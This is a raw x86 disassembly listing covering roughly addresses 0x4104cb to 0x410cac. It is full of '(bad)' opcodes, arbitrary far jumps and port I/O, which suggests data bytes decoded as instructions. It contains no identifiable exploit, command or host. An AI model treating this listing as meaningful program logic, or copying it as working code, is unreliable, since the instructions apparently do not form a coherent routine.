  4104cb:	pop    eax
  4104cc:	daa    
  4104cd:	xchg   dl,ch
  4104cf:	pop    ebx
  4104d0:	pop    ebx
  4104d1:	sbb    BYTE PTR [ebx+0x2a],0xf8
  4104d5:	sub    dl,BYTE PTR [ecx+0x73]
  4104d8:	fidiv  WORD PTR [eax+0x9]
  4104db:	lahf   
  4104dc:	cmp    al,0xb
  4104de:	jg     0x4104f6
  4104e0:	aaa    
  4104e1:	(bad)  
  4104e3:	adc    cl,bl
  4104e5:	(bad)  
  4104e6:	aam    0x9a
  4104e8:	mov    ss,esp
  4104ea:	jp     0x410567
  4104ec:	icebp  
  4104ed:	lods   al,BYTE PTR ds:[esi]
  4104ee:	lods   al,BYTE PTR ds:[esi]
  4104ef:	bound  ebx,QWORD PTR [ecx-0x214d1b6e]
  4104f5:	sbb    BYTE PTR ds:0x23d0feef,ch
  4104fb:	aam    0xdc
  4104fd:	pop    edx
  4104fe:	and    DWORD PTR [eax+ecx*4],eax
  410501:	xchg   ebp,eax
  410502:	dec    eax
  410503:	into   
  410504:	push   esp
  410505:	scas   eax,DWORD PTR es:[edi]
  410506:	sub    eax,0xd93d254
  41050b:	and    ah,BYTE PTR [ecx-0x71336e8c]
  410511:	cli    
  410512:	test   DWORD PTR [eax],edi
  410514:	out    dx,al
  410515:	icebp  
  410516:	xor    DWORD PTR [eax-0x3580a813],0x736aadb7
  410520:	mov    eax,0x7770fbdf
  410525:	and    bh,BYTE PTR [ebx-0x50]
  410528:	ror    DWORD PTR [ebx],0x4c
  41052b:	mov    ch,0x96
  41052d:	add    ebx,DWORD PTR [esi]
  41052f:	pusha  
  410530:	mov    ah,0xbc
  410532:	and    edx,DWORD PTR [ecx]
  410534:	or     BYTE PTR [ecx+0x62],dh
  410537:	mov    WORD PTR [esp+edx*1+0x13],es
  41053b:	and    al,0x27
  41053d:	jg     0x410581
  41053f:	popa   
  410540:	jne    0x410533
  410542:	xchg   BYTE PTR [eax+0x2ff67e36],cl
  410548:	ins    DWORD PTR es:[edi],dx
  410549:	jne    0x4105af
  41054b:	retf   
  41054c:	lods   eax,DWORD PTR ds:[esi]
  41054d:	arpl   ax,bx
  41054f:	scas   al,BYTE PTR es:[edi]
  410550:	out    0x22,al
  410552:	(bad)  
  410553:	mov    edx,0x8cc96d37
  410558:	mov    WORD PTR [eax+0x6b],?
  41055b:	sub    eax,0x84426e5
  410560:	fimul  WORD PTR [edi+edi*2+0x27]
  410564:	and    bl,BYTE PTR [esi+ebp*2]
  410567:	stc    
  410568:	jns    0x4105dc
  41056a:	out    0x4f,al
  41056c:	xor    al,BYTE PTR [esi-0x4a2a0235]
  410572:	out    dx,eax
  410573:	shr    BYTE PTR [eax],0x31
  410576:	pop    esp
  410577:	xor    ah,bl
  410579:	inc    ebx
  41057a:	cmp    BYTE PTR [ebp-0x1c],dh
  41057d:	xchg   DWORD PTR [eax],edx
  41057f:	es retf 
  410581:	mov    al,ds:0x1f8af135
  410586:	leave  
  410587:	ffreep st(1)
  410589:	xor    DWORD PTR [ebp+0x6415cc3a],ecx
  41058f:	loope  0x410530
  410591:	adc    eax,0x18cba712
  410596:	add    dl,ah
  410598:	(bad)  
  410599:	int    0x24
  41059b:	inc    esp
  41059c:	(bad)  
  41059d:	fcom   QWORD PTR [ebp+0x3e]
  4105a0:	fimul  DWORD PTR [edi+0x1e]
  4105a3:	push   ebx
  4105a4:	dec    ecx
  4105a5:	adc    BYTE PTR [eax],cl
  4105a7:	xor    BYTE PTR [esi],cl
  4105a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105aa:	xchg   esi,eax
  4105ab:	stos   BYTE PTR es:[edi],al
  4105ac:	setge  bl
  4105af:	pushf  
  4105b0:	ret    0xb571
  4105b3:	jnp    0x4105b3
  4105b5:	jle    0x4105c6
  4105b7:	cmp    eax,0x2f9e8a4
  4105bc:	or     dh,BYTE PTR [edi-0x77]
  4105bf:	sub    eax,0xaf86de74
  4105c4:	jl     0x4105bf
  4105c6:	(bad)  
  4105c8:	or     bh,BYTE PTR [ecx-0x37a224e1]
  4105ce:	inc    edx
  4105cf:	mov    ch,0x73
  4105d1:	cli    
  4105d2:	bound  ebx,QWORD PTR [ebp+esi*8+0x43]
  4105d6:	aas    
  4105d7:	sub    esi,DWORD PTR [eax+0xe]
  4105da:	dec    eax
  4105db:	in     eax,0x91
  4105dd:	adc    eax,0xfce738d9
  4105e2:	mov    BYTE PTR [ebp+0xb49afce],0x20
  4105e9:	shl    DWORD PTR [esi-0x7f],1
  4105ec:	sbb    dh,BYTE PTR [eax]
  4105ee:	neg    DWORD PTR [edi+0x37]
  4105f1:	icebp  
  4105f2:	dec    esp
  4105f3:	pop    eax
  4105f4:	daa    
  4105f5:	jl     0x410643
  4105f7:	lock or eax,0xa2584065
  4105fd:	fisttp WORD PTR [ebx]
  4105ff:	popf   
  410600:	mov    bh,BYTE PTR [eax+0x315dfc6c]
  410606:	sub    esi,DWORD PTR [eax]
  410608:	(bad)  
  41060a:	sub    al,0xa6
  41060c:	retf   
  41060d:	pop    eax
  41060e:	je     0x410677
  410610:	and    ah,0x79
  410613:	pop    es
  410614:	jecxz  0x41060d
  410616:	pop    esp
  410617:	fxch   st(5)
  410619:	jge    0x41063f
  41061b:	or     edi,edi
  41061d:	call   0x9cfd:0x5c5ed8eb
  410624:	nop
  410625:	lds    ebp,FWORD PTR ss:[ebp-0x4d]
  410629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41062a:	sub    bl,BYTE PTR [esi+ecx*8+0x183eac4b]
  410631:	and    DWORD PTR [esi-0x5dc80d17],edi
  410637:	mov    ebp,0x9772632a
  41063c:	arpl   WORD PTR [ebp-0x11515c1c],cx
  410642:	shl    bh,0x94
  410645:	or     eax,0xfacf4d0
  41064a:	inc    ebp
  41064b:	stc    
  41064c:	xchg   esi,eax
  41064d:	fst    QWORD PTR [ecx-0x293dca0e]
  410653:	into   
  410654:	fwait
  410655:	outs   dx,BYTE PTR ds:[esi]
  410656:	call   0x9ef6460f
  41065b:	mov    eax,0x8cd9aa5e
  410660:	pushf  
  410661:	cmp    eax,DWORD PTR [ebx]
  410663:	movzx  esp,WORD PTR [ebx+0x33]
  410667:	shl    DWORD PTR [ebx+0x5],cl
  41066a:	or     DWORD PTR [eax-0x9ae7e78],ebx
  410670:	fwait
  410671:	(bad)  
  410672:	pop    esp
  410673:	(bad)  
  410674:	shl    cl,cl
  410676:	inc    esi
  410677:	mov    ch,BYTE PTR [eax+esi*1-0x44f4fe15]
  41067e:	shl    BYTE PTR [edx],1
  410680:	cmp    al,0xf
  410682:	mov    bl,0xdf
  410684:	clc    
  410685:	movmskps ebp,xmm2
  410688:	xor    BYTE PTR [esi],bh
  41068a:	test   BYTE PTR [edx+ecx*2-0x50e9ef7],al
  410691:	std    
  410692:	sub    bh,ah
  410694:	mov    ecx,0xe1b3ff2c
  410699:	(bad)  
  41069b:	loop   0x4106cd
  41069d:	lods   al,BYTE PTR ds:[esi]
  41069e:	ret    
  41069f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a0:	cdq    
  4106a1:	add    cl,dl
  4106a3:	jbe    0x41064b
  4106a5:	xchg   esi,eax
  4106a6:	inc    edx
  4106a7:	ret    
  4106a8:	fs std 
  4106aa:	push   cs
  4106ab:	je     0x4106fa
  4106ad:	push   esi
  4106ae:	mov    ds:0x9361d358,al
  4106b3:	xlat   BYTE PTR ds:[ebx]
  4106b4:	rcr    bl,cl
  4106b6:	add    BYTE PTR [ebx],al
  4106b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106b9:	imul   edi,esp,0x76b29e73
  4106bf:	popf   
  4106c0:	cdq    
  4106c1:	stos   BYTE PTR es:[edi],al
  4106c2:	inc    ebp
  4106c3:	mov    eax,0xb94c74df
  4106c8:	push   ecx
  4106c9:	push   esi
  4106ca:	in     al,0x54
  4106cc:	lea    ebp,[eax]
  4106ce:	leave  
  4106cf:	ins    BYTE PTR es:[edi],dx
  4106d0:	xchg   DWORD PTR [edx-0x5cc97bc6],esp
  4106d6:	inc    edx
  4106d7:	pop    ecx
  4106d8:	ret    
  4106d9:	push   ebp
  4106da:	lods   eax,DWORD PTR ds:[esi]
  4106db:	mov    ebp,0xe8464962
  4106e0:	inc    esi
  4106e1:	mov    bl,BYTE PTR [eax]
  4106e3:	and    esp,DWORD PTR [ebx+esi*2-0x3104c70f]
  4106ea:	bound  eax,QWORD PTR es:[edx+eiz*1+0x12]
  4106ef:	repz sub bh,bh
  4106f2:	mov    WORD PTR [eax],cs
  4106f4:	sbb    edx,eax
  4106f6:	in     al,0xfd
  4106f8:	retf   
  4106f9:	jno    0x41070a
  4106fb:	imul   esi,edx,0x1e992e51
  410701:	push   cs
  410702:	je     0x410730
  410704:	inc    esi
  410705:	and    al,0x6f
  410707:	je     0x410737
  410709:	out    dx,al
  41070a:	cmc    
  41070b:	mov    gs,WORD PTR [edi+0x3513f55c]
  410711:	push   esp
  410712:	sbb    eax,0xbd47213
  410717:	retf   
  410718:	xchg   edx,eax
  410719:	test   eax,0xc95456ff
  41071e:	push   es
  41071f:	inc    ebx
  410720:	push   0x71678b78
  410725:	mov    edi,esp
  410727:	jnp    0x410791
  410729:	mov    ds:0x845884f,eax
  41072e:	js     0x410769
  410730:	fistp  QWORD PTR [esi]
  410732:	mov    BYTE PTR [ecx-0x17],dl
  410735:	pushf  
  410736:	push   esp
  410737:	sar    DWORD PTR ds:0xcc659031,1
  41073d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41073e:	fs add edi,edx
  410741:	(bad)  
  410743:	cwde   
  410744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410745:	jnp    0x4106e1
  410747:	ss bswap esp
  41074a:	mov    ds:0x307762ed,al
  41074f:	jae    0x410728
  410751:	mov    WORD PTR [edi+eiz*4],fs
  410754:	sbb    DWORD PTR [edi+0x349f1a69],eax
  41075a:	push   esi
  41075b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41075c:	fidiv  DWORD PTR [ebp+0x2b]
  41075f:	and    edi,DWORD PTR [ebp+ecx*1+0x29bc44b5]
  410766:	mov    ds:0x9166d4c9,eax
  41076b:	and    ah,BYTE PTR es:0x6fbd4d0f
  410772:	arpl   WORD PTR [edx],si
  410774:	add    ebp,DWORD PTR [eax]
  410776:	loop   0x410734
  410778:	inc    eax
  410779:	addr16 pusha 
  41077b:	cli    
  41077c:	push   0x364bbdc5
  410781:	test   dl,al
  410783:	and    al,0xb3
  410785:	mov    bl,0x40
  410787:	lds    eax,FWORD PTR [eax-0x48]
  41078a:	js     0x41077a
  41078c:	test   DWORD PTR [ebx+0x18],ecx
  41078f:	or     DWORD PTR [esi+eiz*1+0x5c163211],edi
  410796:	(bad)  
  410797:	xchg   esi,eax
  410798:	push   ds
  410799:	cmp    edi,DWORD PTR [eax]
  41079b:	ds pop esp
  41079d:	pop    ds
  41079e:	sahf   
  41079f:	add    al,0xb0
  4107a1:	popa   
  4107a2:	adc    ah,BYTE PTR [esi]
  4107a4:	jle    0x4107e5
  4107a6:	mov    al,ds:0xb2725f7a
  4107ab:	or     al,0x34
  4107ad:	ins    DWORD PTR es:[edi],dx
  4107ae:	jecxz  0x4107d1
  4107b0:	jae    0x4107fd
  4107b2:	inc    ebp
  4107b3:	mov    ch,0x26
  4107b5:	add    al,0x4
  4107b7:	(bad)  
  4107b8:	in     al,0xc1
  4107ba:	call   0xe9ee:0xe20df410
  4107c1:	retf   
  4107c2:	xor    ebx,DWORD PTR [edx+eiz*8+0x6d]
  4107c6:	add    al,0xb2
  4107c8:	xor    BYTE PTR [eax+0x558ac9],ah
  4107ce:	sbb    edx,DWORD PTR [ecx]
  4107d0:	not    BYTE PTR [edi+0x743a4a54]
  4107d6:	mov    ds:0x2bf512ba,eax
  4107db:	sbb    eax,0x13ebfa07
  4107e0:	enter  0x48d1,0xa3
  4107e4:	stos   BYTE PTR es:[edi],al
  4107e5:	adc    eax,DWORD PTR [edi+0x13]
  4107e8:	outs   dx,BYTE PTR ds:[esi]
  4107e9:	cmp    al,0xb1
  4107eb:	push   ebx
  4107ec:	and    edx,esp
  4107ee:	and    cl,bh
  4107f0:	xchg   esi,eax
  4107f1:	call   0xef414a49
  4107f6:	sbb    BYTE PTR [ebx+0x33],ch
  4107f9:	cli    
  4107fa:	sub    eax,0x18ebd0b1
  4107ff:	xor    bh,bh
  410801:	leave  
  410802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410803:	jmp    0x7998:0xc3335607
  41080a:	arpl   sp,bp
  41080c:	popa   
  41080d:	adc    BYTE PTR [edx+0x3],0xbd
  410811:	stos   BYTE PTR es:[edi],al
  410812:	call   0x2666471
  410817:	mov    edx,0xbac0c1af
  41081c:	sub    ebp,ebx
  41081e:	clc    
  41081f:	mov    ah,0x9
  410821:	jbe    0x41084b
  410823:	fiadd  WORD PTR [esp+ecx*8+0x796d9d58]
  41082a:	inc    esi
  41082b:	or     eax,0xad0db2f8
  410830:	lahf   
  410831:	sahf   
  410832:	mov    dh,BYTE PTR [esi]
  410834:	add    BYTE PTR [ebx+0x22],cl
  410837:	xlat   BYTE PTR ds:[ebx]
  410838:	out    0xac,eax
  41083a:	rol    BYTE PTR [ecx-0x7dd9aded],cl
  410840:	hlt    
  410841:	jecxz  0x410891
  410843:	xor    al,0x8f
  410845:	imul   edi,DWORD PTR [esi],0x51
  410848:	pop    eax
  410849:	aad    0x34
  41084b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41084c:	mov    edi,0xdb266d04
  410851:	or     eax,DWORD PTR [esi-0x3e]
  410854:	mov    ch,0x5e
  410856:	shr    DWORD PTR [ebp-0x6ad44ca9],1
  41085c:	mul    DWORD PTR [edx+ebp*8]
  41085f:	or     dh,dl
  410861:	imul   eax,ebx,0xc78ae0de
  410867:	(bad)  
  410868:	jmp    0x863:0x8e3321d
  41086f:	fcom   QWORD PTR [ebp+0x74ebe187]
  410875:	or     esi,DWORD PTR ds:[esi]
  410878:	retf   0xb697
  41087b:	sbb    eax,0xf3f05eec
  410880:	pop    ds
  410881:	pop    esp
  410882:	mov    eax,ds:0xfba8b114
  410887:	loope  0x4108d8
  410889:	out    dx,al
  41088a:	in     al,dx
  41088b:	daa    
  41088c:	je     0x410815
  41088e:	sub    DWORD PTR [ecx+0x34aa36a1],esi
  410894:	jle    0x41082e
  410896:	sbb    BYTE PTR [esi],ah
  410898:	or     ebp,esp
  41089a:	cld    
  41089b:	cdq    
  41089c:	aas    
  41089d:	sbb    al,BYTE PTR [ebx]
  41089f:	loop   0x41087d
  4108a1:	cmp    bl,BYTE PTR [ebx-0x38]
  4108a4:	cmp    edi,edi
  4108a6:	clc    
  4108a7:	cmp    eax,0x15df03c6
  4108ac:	popa   
  4108ad:	test   al,0x28
  4108af:	outs   dx,DWORD PTR ds:[esi]
  4108b0:	sub    al,0xb3
  4108b2:	pop    ebp
  4108b3:	dec    eax
  4108b4:	outs   dx,DWORD PTR ds:[esi]
  4108b5:	sbb    DWORD PTR [eax+0x1c],0x772d1a50
  4108bc:	push   edi
  4108bd:	loop   0x4108a2
  4108bf:	sub    esi,DWORD PTR [eax+0x108e37cb]
  4108c5:	addr16 jp 0x4108f4
  4108c8:	mov    ecx,0x3b31f453
  4108cd:	(bad)  
  4108ce:	addr16 mov ecx,0xb921b311
  4108d4:	add    ebp,DWORD PTR [ebp+0x51182d78]
  4108da:	and    al,0x5c
  4108dc:	xchg   ebx,eax
  4108dd:	stos   BYTE PTR es:[edi],al
  4108de:	push   0xe54e73b7
  4108e3:	cmp    ebp,DWORD PTR [esi]
  4108e5:	cmp    esi,ebp
  4108e7:	ficom  DWORD PTR [eax+0x6b]
  4108ea:	mov    esi,ebx
  4108ec:	and    BYTE PTR [eax],ch
  4108ee:	lock rol DWORD PTR [eax-0xeab9dd9],1
  4108f5:	dec    esi
  4108f6:	mov    bl,0x3
  4108f8:	pop    edx
  4108f9:	out    dx,eax
  4108fa:	scas   al,BYTE PTR es:[edi]
  4108fb:	rcl    BYTE PTR [edi],0xc9
  4108fe:	imul   ecx,DWORD PTR [ecx+0x43],0xf66b4d7e
  410905:	in     eax,0xb7
  410907:	cs push es
  410909:	inc    edi
  41090a:	push   ebp
  41090b:	ror    ebp,1
  41090d:	jns    0x410962
  41090f:	dec    ecx
  410910:	ror    BYTE PTR [eax+0x4a233d93],0x4d
  410917:	mov    ds:0xdcc09078,eax
  41091c:	push   es
  41091d:	jb     0x410907
  41091f:	jmp    0x7bed:0xa22b9fd6
  410926:	mov    al,ds:0x37739b21
  41092b:	inc    ecx
  41092c:	scas   al,BYTE PTR es:[edi]
  41092d:	pop    esi
  41092e:	mov    ds:0x84d7658d,eax
  410933:	fidiv  WORD PTR [edi+ebx*4]
  410936:	call   0x416dff77
  41093b:	xor    ebx,DWORD PTR [eax-0xe]
  41093e:	loop   0x41090b
  410940:	gs loopne 0x41094a
  410943:	rcl    DWORD PTR ds:0xd404b3e4,1
  410949:	pop    ss
  41094a:	or     bh,BYTE PTR [ebp-0x60]
  41094d:	sub    al,0xe0
  41094f:	popa   
  410950:	fcmovbe st,st(2)
  410952:	test   eax,0xa089d834
  410957:	aam    0xe3
  410959:	bound  ebp,QWORD PTR [edi+0x62213fdb]
  41095f:	ins    BYTE PTR es:[edi],dx
  410960:	call   0x847a:0x1efea8f4
  410967:	jle    0x41098e
  410969:	std    
  41096a:	dec    ebx
  41096b:	stos   BYTE PTR es:[edi],al
  41096c:	jno    0x41092d
  41096e:	cmp    eax,0xc1af3643
  410973:	cmp    ebx,DWORD PTR [esi]
  410975:	js     0x4109b5
  410977:	jae    0x410933
  410979:	rcr    DWORD PTR [ebp-0x7e],1
  41097c:	int3   
  41097d:	loop   0x410994
  41097f:	repnz adc BYTE PTR [eax+0x7799c64e],cl
  410986:	dec    esi
  410987:	xor    eax,0x719756a4
  41098c:	cmp    eax,0x4dec8d5d
  410991:	jecxz  0x410984
  410993:	and    eax,0xd080b1af
  410998:	inc    ebp
  410999:	aad    0xb1
  41099b:	mov    al,0x1f
  41099d:	push   DWORD PTR cs:[edx-0x4f]
  4109a1:	outs   dx,DWORD PTR ds:[esi]
  4109a2:	jle    0x4109fe
  4109a4:	inc    edi
  4109a5:	lods   al,BYTE PTR ds:[esi]
  4109a6:	push   edx
  4109a7:	ficomp WORD PTR [edx]
  4109a9:	mov    ds:0x4c6bc86f,al
  4109ae:	lods   eax,DWORD PTR ds:[esi]
  4109af:	pop    esp
  4109b0:	loopne 0x4109a0
  4109b2:	imul   esp,DWORD PTR [edx-0x2f9fde87],0xd76333d7
  4109bc:	fistp  QWORD PTR [esi+ebx*4-0x77]
  4109c0:	xchg   dh,dl
  4109c2:	jno    0x4109e3
  4109c4:	xchg   ebx,eax
  4109c5:	(bad)  
  4109c6:	pop    esi
  4109c7:	aad    0x53
  4109c9:	test   eax,0x495272ae
  4109ce:	inc    ebx
  4109cf:	std    
  4109d0:	mov    eax,ds:0x31d6ca0a
  4109d5:	or     eax,0xa40a3b86
  4109da:	mov    cl,0x4c
  4109dc:	mov    edi,0x17d11d47
  4109e1:	mov    cl,0x44
  4109e3:	shr    DWORD PTR [ebx+ebp*4+0x6ccfdc43],cl
  4109ea:	xor    dh,ah
  4109ec:	dec    esi
  4109ed:	in     eax,0x3f
  4109ef:	jge    0x410a43
  4109f1:	pusha  
  4109f2:	mov    ?,WORD PTR [eax-0x7ccfe487]
  4109f8:	outs   dx,DWORD PTR ds:[esi]
  4109f9:	ret    0xb89a
  4109fc:	mov    bl,0x38
  4109fe:	inc    eax
  4109ff:	jmp    0x27a:0xd2b21cdc
  410a06:	stos   BYTE PTR es:[edi],al
  410a07:	popf   
  410a08:	ja     0x4109df
  410a0a:	shl    DWORD PTR [ebp-0x25],1
  410a0d:	pop    edx
  410a0e:	push   cs
  410a0f:	push   ds
  410a10:	xchg   ebp,eax
  410a11:	in     eax,0x8b
  410a13:	mov    ah,0x52
  410a15:	rcl    DWORD PTR [ebp+0x37],0xe4
  410a19:	outs   dx,BYTE PTR ds:[esi]
  410a1a:	call   0x9f86480e
  410a1f:	imul   edi,DWORD PTR [eax+0x2d469b53],0xaa9545fc
  410a29:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  410a2b:	stos   DWORD PTR es:[edi],eax
  410a2c:	sub    esp,ebp
  410a2e:	aaa    
  410a2f:	pop    ebp
  410a30:	and    al,0x40
  410a32:	push   ebx
  410a33:	adc    DWORD PTR [edx+edi*1-0x9247721],edx
  410a3a:	jmp    0x410a77
  410a3c:	daa    
  410a3d:	pop    ebx
  410a3e:	pop    eax
  410a3f:	lahf   
  410a40:	jb     0x4109d7
  410a42:	es xchg ebp,eax
  410a44:	cwde   
  410a45:	jae    0x410a5e
  410a47:	ja     0x4109db
  410a49:	jns    0x410a5f
  410a4b:	adc    eax,0xecad02d8
  410a50:	jno    0x410a94
  410a52:	(bad)  
  410a53:	int3   
  410a54:	push   cs
  410a55:	call   DWORD PTR [esi]
  410a57:	scas   eax,DWORD PTR es:[edi]
  410a58:	add    WORD PTR [edx+0x519a135e],ax
  410a5f:	in     al,dx
  410a60:	test   al,0xb2
  410a62:	xor    al,0xb5
  410a64:	into   
  410a65:	xchg   esp,eax
  410a66:	repnz mov ch,0x53
  410a6a:	jg     0x410a75
  410a6c:	repnz adc eax,DWORD PTR [ebx+0x3c]
  410a70:	push   es
  410a71:	stos   DWORD PTR es:[edi],eax
  410a72:	add    eax,0x272955a4
  410a77:	test   al,0x49
  410a79:	dec    BYTE PTR [esi+ecx*4-0x53]
  410a7d:	cmp    BYTE PTR [ebx],cl
  410a7f:	pushf  
  410a80:	je     0x410aa9
  410a82:	push   esp
  410a83:	and    DWORD PTR ds:0x6207ec12,ebx
  410a89:	fwait
  410a8a:	pop    esi
  410a8b:	jle    0x410afb
  410a8d:	mov    BYTE PTR [edi],ch
  410a8f:	in     al,0xa9
  410a91:	aas    
  410a92:	pop    es
  410a93:	cli    
  410a94:	push   esp
  410a95:	xor    ch,ch
  410a97:	cmp    eax,0x578eb295
  410a9c:	push   eax
  410a9d:	pop    edi
  410a9e:	adc    al,0x54
  410aa0:	mov    dl,0xe7
  410aa2:	gs inc edx
  410aa4:	push   ecx
  410aa5:	sub    esi,DWORD PTR [edx]
  410aa7:	adc    BYTE PTR [esp+ecx*1],bl
  410aaa:	sbb    al,0x22
  410aac:	and    BYTE PTR [edx],cl
  410aae:	mov    dh,0xbd
  410ab0:	add    ch,BYTE PTR [esi+0x7d]
  410ab3:	inc    eax
  410ab4:	jg     0x410ae3
  410ab6:	sub    ah,BYTE PTR [edi+0x5c]
  410ab9:	sub    ebx,DWORD PTR [edx-0x59f3613a]
  410abf:	jmp    ebp
  410ac1:	mov    dl,0x83
  410ac3:	lods   eax,DWORD PTR ds:[esi]
  410ac4:	ins    BYTE PTR es:[edi],dx
  410ac5:	outs   dx,DWORD PTR ds:[esi]
  410ac6:	adc    DWORD PTR [ebp+0x4d],0xffffffee
  410aca:	pop    eax
  410acb:	sbb    eax,esp
  410acd:	test   al,0x78
  410acf:	sub    al,0x5a
  410ad1:	sbb    cl,BYTE PTR [edi]
  410ad3:	mov    ebx,0xfe025750
  410ad8:	push   ecx
  410ad9:	aad    0x7d
  410adb:	or     al,0xf
  410add:	push   esi
  410ade:	bound  edx,QWORD PTR [edx-0x60ca5ef4]
  410ae4:	pop    edi
  410ae5:	aam    0x4b
  410ae7:	jae    0x410acd
  410ae9:	mov    eax,ds:0xeacc23d6
  410aee:	dec    DWORD PTR [ebp-0x9]
  410af1:	aas    
  410af2:	out    dx,eax
  410af3:	jmp    0xa315c75b
  410af8:	sub    ebx,DWORD PTR [eax-0x49d18917]
  410afe:	and    BYTE PTR [esi+esi*4],bh
  410b01:	es jl  0x410b23
  410b04:	bound  ebx,QWORD PTR ds:0x846667d
  410b0a:	add    BYTE PTR [edx-0x73679264],al
  410b10:	imul   DWORD PTR ss:[edx]
  410b13:	scas   eax,DWORD PTR es:[edi]
  410b14:	cs addr16 adc bl,al
  410b18:	mov    ds:0x6f3284c,eax
  410b1d:	pop    ebp
  410b1e:	xor    eax,0xf2222bdb
  410b23:	mov    ecx,0x316bb81f
  410b28:	in     al,dx
  410b29:	adc    bh,BYTE PTR [esi-0x41]
  410b2c:	mov    al,0xcf
  410b2e:	jmp    0x410b9c
  410b30:	les    esp,FWORD PTR [ebx-0x5d]
  410b33:	test   eax,0xa0170d60
  410b38:	jp     0x410ae9
  410b3a:	push   esi
  410b3b:	push   esp
  410b3c:	sbb    ch,ch
  410b3e:	pop    esp
  410b3f:	cli    
  410b40:	dec    esp
  410b41:	into   
  410b42:	add    eax,0x623b13d1
  410b47:	dec    esp
  410b48:	sub    BYTE PTR [esi-0xe163b1f],dl
  410b4e:	clc    
  410b4f:	js     0x410b5d
  410b51:	fwait
  410b52:	mov    ecx,0x21f3f716
  410b57:	(bad)  
  410b58:	clc    
  410b59:	mov    ebp,0x78d63a57
  410b5e:	adc    eax,0xeb7d7a5a
  410b63:	sahf   
  410b64:	sbb    eax,0xe9509287
  410b69:	jl     0x410afb
  410b6b:	and    al,0xcd
  410b6d:	nop
  410b6e:	and    cl,BYTE PTR [ebx+0x42724043]
  410b74:	mov    edx,0xecdf23ee
  410b79:	sub    DWORD PTR [ebp+0x53],ebx
  410b7c:	xchg   ebp,eax
  410b7d:	ror    BYTE PTR [ecx],1
  410b7f:	cld    
  410b80:	mov    edx,DWORD PTR [ebx]
  410b82:	lds    esi,FWORD PTR [edx+ecx*2-0x1794af33]
  410b89:	inc    ebp
  410b8a:	in     al,dx
  410b8b:	inc    edx
  410b8c:	call   DWORD PTR [esi-0x51]
  410b8f:	stc    
  410b90:	lahf   
  410b91:	add    al,0x5a
  410b93:	mov    ecx,0x40e872f1
  410b98:	dec    ebx
  410b99:	cmc    
  410b9a:	and    al,0xbc
  410b9c:	inc    edi
  410b9d:	fadd   DWORD PTR [ebx]
  410b9f:	mov    BYTE PTR [ecx],cl
  410ba1:	xchg   edi,eax
  410ba2:	test   DWORD PTR [eax-0x2015829c],edx
  410ba8:	ss callw 0x4bc1
  410bad:	pop    ecx
  410bae:	stos   BYTE PTR es:[edi],al
  410baf:	pop    esp
  410bb0:	into   
  410bb1:	push   edx
  410bb2:	out    0x44,al
  410bb4:	jecxz  0x410c09
  410bb6:	jae    0x410b87
  410bb8:	rcr    BYTE PTR [ebx],cl
  410bba:	mov    ebx,0x62bb6189
  410bbf:	test   al,0x4c
  410bc1:	inc    edi
  410bc2:	lock ret 
  410bc4:	pop    es
  410bc5:	test   DWORD PTR fs:[esi+0xefa87e0],0xa18f953
  410bd0:	adc    al,BYTE PTR [ebp+eax*8+0x43fbb543]
  410bd7:	inc    ecx
  410bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bd9:	adc    DWORD PTR [ebp+0x7a],0xffffffa9
  410bdd:	cmp    DWORD PTR [ebx],edx
  410bdf:	(bad)  
  410be0:	pushf  
  410be1:	pop    es
  410be2:	(bad)  
  410be3:	cmp    eax,0x8d5cefba
  410be8:	push   eax
  410be9:	or     eax,0xeac5f5f6
  410bee:	mov    edx,db6
  410bf1:	add    eax,0xcd05239d
  410bf6:	push   esi
  410bf7:	fdivr  QWORD PTR [esi-0x3efadfae]
  410bfd:	call   0x937e:0xa30a357f
  410c04:	mov    ch,0x62
  410c06:	cmp    DWORD PTR [eax+esi*8-0x31],0x2c
  410c0b:	push   esi
  410c0c:	clc    
  410c0d:	mov    esi,0x9985fa19
  410c12:	push   edi
  410c13:	test   eax,0x80080283
  410c18:	stc    
  410c19:	mov    esp,0xdb43e6bc
  410c1e:	pop    ds
  410c1f:	out    dx,al
  410c20:	shl    DWORD PTR [eax],0xa8
  410c23:	(bad)  
  410c24:	fwait
  410c25:	clc    
  410c26:	sbb    eax,0x1b9f07f1
  410c2b:	test   dl,bh
  410c2d:	iret   
  410c2e:	xchg   esp,eax
  410c2f:	adc    DWORD PTR [ecx+0x49742be3],0x5769cf31
  410c39:	ss rol al,cl
  410c3c:	inc    esp
  410c3d:	fisub  WORD PTR [esi-0x1a685777]
  410c43:	xor    edi,esi
  410c45:	ror    ebx,1
  410c47:	mov    ebp,0xc88dbca8
  410c4c:	sub    BYTE PTR [ecx+0x3d],dl
  410c4f:	push   edi
  410c50:	cmp    al,0x71
  410c52:	pop    ecx
  410c53:	aam    0xbf
  410c55:	test   al,0xf8
  410c57:	sahf   
  410c58:	lods   al,BYTE PTR ds:[esi]
  410c59:	push   edi
  410c5a:	push   ecx
  410c5b:	(bad)  
  410c5c:	repz hlt 
  410c5e:	dec    ebx
  410c5f:	rol    ch,cl
  410c61:	adc    al,0x6c
  410c63:	cdq    
  410c64:	jmp    0x410c42
  410c66:	inc    ebx
  410c67:	sahf   
  410c68:	xor    al,0x3e
  410c6a:	mov    esp,0x3dd15ba0
  410c6f:	dec    edx
  410c70:	mov    esi,0xb78b2f
  410c75:	test   eax,0x634afcc1
  410c7a:	clc    
  410c7b:	js     0x410c35
  410c7d:	cmp    ebx,esi
  410c7f:	mov    ah,0x9d
  410c81:	std    
  410c82:	iret   
  410c83:	call   0xd695bf66
  410c88:	lock (bad) [esi*1+0x6176dc1b]
  410c90:	mov    esp,0xd3f3fb15
  410c95:	add    bl,BYTE PTR [edi+ecx*8-0x3e00528d]
  410c9c:	mov    bl,BYTE PTR [edi+edi*8]
  410c9f:	pop    eax
  410ca0:	nop
  410ca1:	mov    ds:0x41a237b8,eax
  410ca6:	mov    ds:0xb1543982,eax
  410cab:	pop    ebx
  410cac:	dec    ebx
